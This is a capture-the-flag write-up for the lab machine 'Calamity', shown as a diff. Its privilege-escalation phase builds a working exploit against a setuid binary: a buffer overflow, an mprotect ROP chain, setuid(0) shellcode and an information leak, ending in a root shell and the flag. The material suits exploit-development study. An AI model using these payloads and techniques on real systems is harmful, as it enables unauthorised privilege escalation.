@@ -1,0 +1,595 @@
+Phase 3 - Privilege Escalation
+
+    But It was the ssh login.
+
+➜  ~ ssh xalvas@10.10.10.27
+xalvas@10.10.10.27s password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+9 packages can be updated.
+8 updates are security updates.
+
+
+Last login: Mon Jan 15 19:21:45 2018 from 10.10.14.56
+xalvas@calamity:~$ 
+
+Having a look around we found a binary with the suid bit set without even needing to run the find command
+
+xalvas@calamity:~$ ls -la app
+total 28
+drwxr-x--- 2 root   xalvas  4096 Jun 29  2017 .
+drwxr-xr-x 8 xalvas xalvas  4096 Jan 15 17:34 ..
+-r-sr-xr-x 1 root   root   12584 Jun 29  2017 goodluck  <-- look ma, suid
+-r--r--r-- 1 root   root    3936 Jun 29  2017 src.c
+
+Seems as though this is going to be like babytown frollicks! A suid binary and the source code?! Let’s examine the source to get an idea as to how to approach this.
+Source Code Review
+
+This seems important as it’s creating a buffer of USIZE where data may potentially be user suplied.
+
+#define USIZE 12
+#define ISIZE 4
+
+  struct f {
+    char user[USIZE];
+    //int user;
+    int secret;
+    int admin;
+    int session;
+  }
+hey;
+
+This is allowing for user input in the form of a file to be supplied to the application and as we suspected the file contents are then copied into the previous struct’s user buffer.
+
+void createusername() {
+//I think  something's bad here
+unsigned char for_user[ISIZE];
+
+  printf("\nFilename:  ");
+
+  char fn[30];
+  scanf(" %28s", & fn);
+
+flushit();
+  copy(fn, for_user,USIZE);
+
+
+ strncpy(hey.user,for_user,ISIZE+1);
+  hey.user[ISIZE+1]=0;
+
+}
+
+Honestly I don’t need to read anything else when you literally tell me this is vulnerable, I’m going to start here.
+
+void debug() {
+
+  printf("\nthis function is problematic on purpose\n");
+  printf("\nI'm trying to test some things...and that means get control of the program! \n");
+
+  char vuln[64];
+
+  printf("vulnerable pointer is at %x\n", vuln);
+  printf("memory information on this binary:\n", vuln);
+
+  printmaps();
+
+  printf("\nFilename:  ");
+
+  char fn[30];
+  scanf(" %28s", & fn);
+  flushit();
+  copy(fn,vuln,100);//this shall trigger a buffer overflow
+
+  return;
+
+}
+
+But just to be good padawans we have to look a little more, if nothing else just to put it into the back of our mind, we might need it later! This is definitely going to be interesting as it’s a way to gain administrative privileges to the app, however you need to have a secret and it has to match. There doesn’t appear to be a way to pass the login within the app so we likely will have to pass it through file contents, but we’ll see.
+
+void attempt_login(int shouldbezero, int safety1, int safety2) {
+
+  if (safety2 != safety1) {
+    printf("hackeeerrrr");
+    fflush(stdout);
+	exit(666);
+  }
+  if (shouldbezero == 0) {
+    printf("\naccess denied!\n");
+    fflush(stdout);
+  } else debug();
+
+}
+
+So here we see how our secret gets defined, and it is not something we directly seem to control, however we will come back to this later.
+
+int sess= rand();
+
+  struct timeval tv;
+  gettimeofday( & tv, NULL);
+
+  int whoopsie=0;
+  int protect = tv.tv_usec |0x01010101;//I hate null bytes...still secure !
+
+
+  hey.secret = protect;
+  hey.session = sess;
+  hey.admin = 0;
+
+
+  createusername();
+
+  while (1) {
+    char action = print();
+
+    if (action == '1') {
+      //I striped the code for security reasons !
+
+    } else if (action == '2') {
+      printdeb(hey.session);
+    } else if (action == '3') {
+      attempt_login(hey.admin, protect, hey.secret);
+      //I'm changing the program ! you will never be to log in as admin...
+      //I found some bugs that can do us a lot of harm...I'm trying to contain them but I think I'll have to
+      //write it again from scratch !I hope it's completely harmless now ...
+    }
+
+    else if(action=='4')createusername();
+    else if (action == '5') return;
+
+  }
+
+Exploit Development
+
+First lets run the program and then press ctrl+c to examine some basic information peda supplies to us. We can also run checksec to see what kind of security mechanisms are in place.
+
+xalvas@calamity:~/app$ gdb -q goodluck
+Reading symbols from goodluck...(no debugging symbols found)...done.
+gdb-peda$ r
+Starting program: /home/xalvas/app/goodluck 
+^C
+Program received signal SIGINT, Interrupt.
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xfffffdfc 
+EBX: 0xbffff5d8 --> 0x1 
+ECX: 0xbffff5d8 --> 0x1 
+EDX: 0x7fffffff 
+ESI: 0xb7ffd940 (0xb7ffd940)
+EDI: 0xbffff5d8 --> 0x1 
+EBP: 0x0 
+ESP: 0xbffff59c --> 0x0 
+EIP: 0xb7fdac31 (<__kernel_vsyscall+9>:	pop    ebp)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xb7fdac2b <__kernel_vsyscall+3>:	mov    ebp,esp
+   0xb7fdac2d <__kernel_vsyscall+5>:	sysenter 
+   0xb7fdac2f <__kernel_vsyscall+7>:	int    0x80
+=> 0xb7fdac31 <__kernel_vsyscall+9>:	pop    ebp
+   0xb7fdac32 <__kernel_vsyscall+10>:	pop    edx
+   0xb7fdac33 <__kernel_vsyscall+11>:	pop    ecx
+   0xb7fdac34 <__kernel_vsyscall+12>:	ret    
+   0xb7fdac35:	retf   0xfffa
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff59c --> 0x0 
+0004| 0xbffff5a0 --> 0x7fffffff 
+0008| 0xbffff5a4 --> 0xbffff5d8 --> 0x1 
+0012| 0xbffff5a8 --> 0xb7eca3a0 (<__nanosleep_nocancel+22>:	mov    ebx,edx)
+0016| 0xbffff5ac --> 0xb7eca2fd (<__sleep+109>:	add    esp,0x10)
+0020| 0xbffff5b0 --> 0xbffff5d8 --> 0x1 
+0024| 0xbffff5b4 --> 0xbffff5d8 --> 0x1 
+0028| 0xbffff5b8 --> 0xc2 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGINT
+0xb7fdac31 in __kernel_vsyscall ()
+
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : Partial
+
+Here we can see some interesting bits. First we notice that NX is enabled, this means that data execution will be disabled in the context of the stack. So even if we are able to overwrite memory, or even the Instruction Pointer we will be unable to execute shellcode unless we can find a way to re-enable data execution on the stack. Interestingly, peda returned to us a pop pop pop ret rop chain which starts at 0xb7fdac31.
+
+Next let’s hop into the debug menu we learned about earlier and see what’s what with jump debug
+
+gdb-peda$ jump debug
+Continuing at 0x80000c15.
+
+this function is problematic on purpose
+
+I'm trying to test some things...and that means get control of the program! 
+vulnerable pointer is at bfffee48
+memory information on this binary:
+
+80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
+80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
+80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
+80004000-80025000 rw-p 00000000 00:00 0          [heap]
+b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
+b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
+b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
+b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
+b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
+b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]
+
+
+
+Filename:  
+
+This provides us with some good information from the memorymaps, namely we learn that the vulnerable pointer is at 0xbfffee48 and that the stack is located at 0xbfedf000-c0000000
+
+Before we move forward with learning how we can re-enable execution in the context of the stack, lets see what we’re working with
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100 > fuzzfile
+
+Load this file into the debug menu and attempt to view the session id with menu option 2, then examine the crash
+
+Stopped reason: SIGSEGV
+0x63413563 in ?? ()
+
+With this information we can find the exact offset for our exploit
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
+[*] Exact match at offset 76
+
+Now that we have this information we need to figure out how to re-enable execution on the stack, lets start by disassembling main
+
+gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x80000d77 <+0>:	lea    ecx,[esp+0x4]
+   0x80000d7b <+4>:	and    esp,0xfffffff0
+   0x80000d7e <+7>:	push   DWORD PTR [ecx-0x4]
+   0x80000d81 <+10>:	push   ebp
+   0x80000d82 <+11>:	mov    ebp,esp
+   0x80000d84 <+13>:	push   ebx
+   0x80000d85 <+14>:	push   ecx
+   0x80000d86 <+15>:	sub    esp,0x20
+   0x80000d89 <+18>:	call   0x80000820 <__x86.get_pc_thunk.bx>
+   0x80000d8e <+23>:	add    ebx,0x2272
+   0x80000d94 <+29>:	push   0x1
+   0x80000d96 <+31>:	push   0x3add6
+   0x80000d9b <+36>:	push   0xb7e1a000
+   0x80000da0 <+41>:	call   0xb7efcd50 <mprotect>
+   ---trimmed due to length---
+
+After researching mprotect, I learned that it can be used to re-enable execution on the stack via the entry 10 in the linux manual.
+
+Now mprotect takes three arguments, hence the pop pop pop ret peda returned to us earlier. The first argument is the mapped region of memory, the second is the size of the stack, and the third are the permissions.
+
+We already know the mapped region from the stack output of the debug memorymaps and we already know we want to set it to 0x7 for executable.
+
+We just need to calculate the size of the stack, I use this 9 tool. By subtracting 0xbfedf000 from 0xc0000000 we get 0x121000
+
+With this information we can build a template for our exploit!
+
+# re-enable execution on the stack
+payload += p(0xb7efcd50) # mprotect
+payload += p(0xb7fdac31) # ropgadget for pop3ret
+payload += p(0xbfedf000) # start of stack
+payload += p(0x121000)   # size of stack
+payload += p(0x7)        # permissions
+payload += p(0xbfffee48) # vulnerable pointer
+
+    Note: Never run shellcode if you don’t know what it does.
+
+With this template figured out we can begin building our exploit, but we will need some shellcode to execute, I went with this entry 4 from shell-storm as it performs setuid(0) as well as being able to fit in very limited space being only 28-bytes.
+
+#!/usr/bin/python
+import os
+import struct
+
+# convert address to little-endian format
+def p(arg):
+	return struct.pack('<L', arg)
+
+# /bin/dash
+shellcode = "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"
+nops = "\x90" * 10
+
+# crash with embedded nopsled into shellcode
+payload = nops
+payload += shellcode
+
+# padding
+payload += "A" * ( 76 - len(shellcode) - len(nops) )
+
+# re-enable execution in stack context
+payload += p(0xb7efcd50) # mprotect
+payload += p(0xb7fdac31) # ropgadget for pop3ret
+payload += p(0xbfedf000) # start of stack
+payload += p(0x121000)   # size of stack
+payload += p(0x7)        # permissions
+
+payload += p(0xbfffee48) # vulnerable pointer
+print payload
+
+Now let’s generate our exploit and check out what it looks like in file form
+
+xalvas@calamity:/tmp/test$ python exploit.py > exploit
+xalvas@calamity:/tmp/test$ cat exploit
+����������1ۍC�̀1�Qhn/shh//bi�A
+                              ��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP���1������H���
+
+Now by loading this into the debug function we should get a crash. However keep an eye on the vulnerable pointer reported by the debug function because it will change on each instance of the program, and likely we have crashed it a few times by now :sunglasses:
+
+gdb-peda$ jump debug
+Continuing at 0x80000c15.
+
+this function is problematic on purpose
+
+Im trying to test some things...and that means get control of the program! 
+vulnerable pointer is at bfffee48
+memory information on this binary:
+
+80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
+80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
+80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
+80004000-80025000 rw-p 00000000 00:00 0          [heap]
+b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
+b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
+b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
+b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
+b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
+b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]
+
+
+
+Filename:  /tmp/test/exploit
+process 1680 is executing new program: /bin/dash
+$ id
+[New process 4492]
+process 4492 is executing new program: /usr/bin/id
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+uid=1000(xalvas) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+$ [Inferior 2 (process 4492) exited normally]
+
+Now we have re-enabled executon on the stack proven by the fact our shellcode ran /bin/dash, however because we have run the program through gdb to get to the debug menu we are sandboxed as xalvas and not running with the suid bit we saw earlier.
+Information Leak
+
+The next step will be to find a way to jump into the debug menu from normal execution.
+
+Initially by trying to access admin we get access denied! which if you read attempt_login from the source code review section above that is because its looking for a secret value to match before it will allow you into the debug menu.
+
+So lets start by fuzzing it.
+
+xalvas@calamity:/tmp/test$ echo "A" > fuzz
+
+When we load this file and examine our session id from menu option two we get debug info: 0x37f3a5ef
+
+Without closing the program currently executing in gdb we get the same result until we send it 8 characters which now gives us debug info: 0x0
+
+Interesting, lets try 9: debug info: 0x81fffffd
+
+10, segfault, okay, so now we can try to get an information leak, we need to leak the value from the hey struct we examined earlier to get the value of the secret that gets passed to attempt_login to do this we need to look at the disassembly a bit more.
+
+Let’s try to get an understanding of whats going on
+
+xalvas@calamity:/tmp/test$ echo "AAAABBBBCCCCDDDD" > fuzz
+
+If we load this in and try to examine the session id we get a crash but look closely
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x434343ab 
+EBX: 0x43434343 ('CCCC')
+ECX: 0xa ('\n')
+EDX: 0xb7fcd87c --> 0x0 
+ESI: 0xb7fcc000 --> 0x1b1db0 
+EDI: 0xb7fcc000 --> 0x1b1db0 
+EBP: 0xbffff638 --> 0x0 
+ESP: 0xbffff610 --> 0x1 
+EIP: 0x80000e51 (<main+218>:	mov    eax,DWORD PTR [eax+0x14])
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80000e45 <main+206>:	cmp    BYTE PTR [ebp-0x15],0x32
+   0x80000e49 <main+210>:	jne    0x80000e62 <main+235>
+   0x80000e4b <main+212>:	lea    eax,[ebx+0x68]
+=> 0x80000e51 <main+218>:	mov    eax,DWORD PTR [eax+0x14]
+   0x80000e54 <main+221>:	sub    esp,0xc
+   0x80000e57 <main+224>:	push   eax
+   0x80000e58 <main+225>:	call   0x80000be3 <printdeb>
+   0x80000e5d <main+230>:	add    esp,0x10
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff610 --> 0x1 
+0004| 0xbffff614 --> 0x80003000 --> 0x2ef4 
+0008| 0xbffff618 --> 0x5a5d54f6 
+0012| 0xbffff61c --> 0x84c01 
+0016| 0xbffff620 --> 0x32000001 
+0020| 0xbffff624 --> 0x1094d01 
+0024| 0xbffff628 --> 0x0 
+0028| 0xbffff62c --> 0x31f9663c 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x80000e51 in main ()
+
+What is happening here is EBX is getting loaded with the value of what we place after the first 8-bytes which in this case is “CCCC”, or 0x43434343. We also see that EAX is getting loaded with something similar, using a calculator you will notice there is a difference of 0x68 between both values. One way of moving values around like this is to use a lea instruction so lets look in memory for a lea that copies EBX+0x68 to EAX by disassembling main
+
+gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x80000d77 <+0>:	lea    ecx,[esp+0x4]
+   0x80000d7b <+4>:	and    esp,0xfffffff0
+   0x80000d7e <+7>:	push   DWORD PTR [ecx-0x4]
+   0x80000d81 <+10>:	push   ebp
+   0x80000d82 <+11>:	mov    ebp,esp
+   0x80000d84 <+13>:	push   ebx
+   0x80000d85 <+14>:	push   ecx
+   0x80000d86 <+15>:	sub    esp,0x20
+   ---trimmed due to length---
+   0x80000df8 <+129>:	add    esp,0x10
+   0x80000dfb <+132>:	mov    DWORD PTR [ebp-0x10],0x0
+   0x80000e02 <+139>:	mov    eax,DWORD PTR [ebp-0x1c]
+   0x80000e05 <+142>:	or     eax,0x1010101
+   0x80000e0a <+147>:	mov    DWORD PTR [ebp-0x14],eax
+   0x80000e0d <+150>:	lea    eax,[ebx+0x68]
+   ---trimmed due to length---
+
+bingo, 0x80000e0d <+150>: lea eax,[ebx+0x68]
+
+Next lets find where our hey struct lives by searching for it in memory, conveniently we can search for AAAAB as that is what we used in our fuzzing
+
+gdb-peda$ searchmem AAAAB
+Searching for 'AAAAB' in: None ranges
+Found 2 results, display max 2 items:
+goodluck : 0x80003068 ("AAAAB")
+  [heap] : 0x80004978 ("AAAABBBBCCCCDDDD\n")
+
+So lets start pokin around 0x80003068
+
+gdb-peda$ x/40x 0x80003068
+0x80003068 <hey>:	0x41	0x41	0x41	0x41	0x42	0x00	0x00	0x00
+0x80003070 <hey+8>:	0x00	0x00	0x00	0x00	0x01	0x4d	0x09	0x01
+0x80003078 <hey+16>:	0x00	0x00	0x00	0x00	0x3c	0x66	0xf9	0x31
+0x80003080:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x80003088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+
+Okay this is the start of our hey struct, however we don’t want this address, we actually want to find 0x80003068 - 0x8 - 0x68 as that is what will be put into EBX which after being put into EAX will put us back to right here
+which if you do that math will be the address 0x80002ff8
+
+With this information we can move on to the next phase of our exploit, getting an information leak of our secret value needed to get into option 3
+
+    Note: do not close the program as this changes values of our secret and there-by our information leak will be useless.
+
+# overwrite EBX with address
+# overwrite EAX with address + 0x68
+# this will effectively place us right at the start of our A's because
+# 0x80002ff8 + 0x68 = 0x80003060
+
+xalvas@calamity:/tmp/test$ python -c "print('A' * 8 +'\xf8\x2f\x00\x80')" > phase1
+
+By loading this file and observing the print session option we get the following
+
+xalvas@calamity:~/app$ ./goodluck 
+
+Filename:  /tmp/test/phase1
+
+
+	-----MENU-----
+1) leave message to admin
+2) print session ID
+3)login (admin only)
+4)change user
+5)exit
+
+ action: 2
+
+debug info: 0x1096f49
+
+Assembling The Pieces
+
+Next we need to assemble all of our pieces, we’ll start by making use of this information leak. To do this we need to place the value of our secret in the first four bytes of our file, followed by 4-bytes of junk, and then we need to step back four bytes otherwise our program will crash 0x80002ff8 - 0x4 = 0x80002ff4
+
+#!/usr/bin/python
+import struct
+# session_id dumped from the previous step
+payload = struct.pack("<I", 0x1096f49) # session_id
+# padding
+payload += "A" * 4
+# move backwards 4 so we don't leave junk in memory which will crash the program
+payload += struct.pack("<I", 0x80002ff4) 
+print payload
+
+xalvas@calamity:/tmp/test$ python phase2.py > phase2
+
+By loading this in and attepting to access admin we are dropped into our debug menu.
+
+Filename:  /tmp/test/phase2
+
+
+	-----MENU-----
+1) leave message to admin
+2) print session ID
+3)login (admin only)
+4)change user
+5)exit
+
+ action: 3
+
+this function is problematic on purpose
+
+Im trying to test some things...and that means get control of the program! 
+vulnerable pointer is at bffff5c0
+memory information on this binary:
+
+80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
+80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
+80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
+80004000-80025000 rw-p 00000000 00:00 0          [heap]
+b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
+b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
+b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
+b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
+b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
+b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]
+
+
+
+Filename:  
+
+Next we just need to load in our exploit from earlier, but note the vulnerable pointer has changed to 0xbffff5c0 update your exploit, and bask in the glory of shell 5!
+
+xalvas@calamity:/tmp/test$ python exploit.py > exploit
+
+this function is problematic on purpose
+
+Im trying to test some things...and that means get control of the program! 
+vulnerable pointer is at bffff5c0
+memory information on this binary:
+
+80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
+80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
+80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
+80004000-80025000 rw-p 00000000 00:00 0          [heap]
+b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
+b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
+b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
+b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
+b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
+b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
+b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
+bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]
+
+
+
+Filename:  /tmp/test/exploit
+
+# id
+uid=0(root) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+# cat /root/root.txt
+9be653e014d17d1a54f9045e3220743c
